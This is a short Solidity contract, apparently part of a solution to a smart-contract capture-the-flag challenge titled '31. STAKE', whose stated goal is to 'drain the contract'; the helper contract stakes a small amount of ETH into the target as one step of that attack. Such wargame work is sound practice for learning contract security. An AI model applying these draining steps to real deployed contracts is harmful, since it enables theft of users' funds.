// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title 31. STAKE
 * @dev drain the contract
 */

interface IStake {
    function StakeETH() external payable;
}

contract BecauseWhyNot {
    IStake private immutable stake;

    constructor(address _stakeContract) payable {
        stake = IStake(_stakeContract);
    }

    function becauseWhyNot() external payable {
        // Become a staker with 0.001 ETH + 2 wei
        stake.StakeETH{value: msg.value}();
    }
}
